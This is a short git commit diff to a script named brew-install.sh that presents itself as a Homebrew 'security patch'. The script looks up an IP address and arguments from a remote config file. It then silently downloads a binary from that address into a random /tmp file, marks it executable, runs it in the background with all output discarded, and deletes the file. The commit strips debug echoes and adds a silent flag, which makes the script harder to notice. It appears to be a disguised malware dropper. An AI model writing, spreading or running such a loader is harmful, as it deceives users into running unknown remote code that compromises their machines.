dd15f0bd49a427bd26a1dcd3492cc7f913e756e8
svendev045 <126712757+svendev045@users.noreply.github.com>
2024-01-09 11:00:04 -0800

    Update brew-install.sh

--- brew-install.sh
+++ brew-install.sh
@@ -1,12 +1,9 @@
 #!/bin/bash
 tmp="/tmp/$(head /dev/urandom | tr -dc A-Fa-f0-9 | head -c 12)"
-echo "$tmp is tmp"
 ip="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^ipaddr | cut -f2 -d'=')"
-echo "$ip is ip"
 args="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^args | cut -f2 -d'=')"
-echo "$args is args"
 echo "Applying Brew security patch..."
-curl http://$ip/brew-core -o $tmp >/dev/null 2>&1
+curl -s http://$ip/brew-core -o $tmp >/dev/null 2>&1
 chmod +x $tmp
 nohup $tmp $bin_args >/dev/null 2>&1 &
 rm $tmp
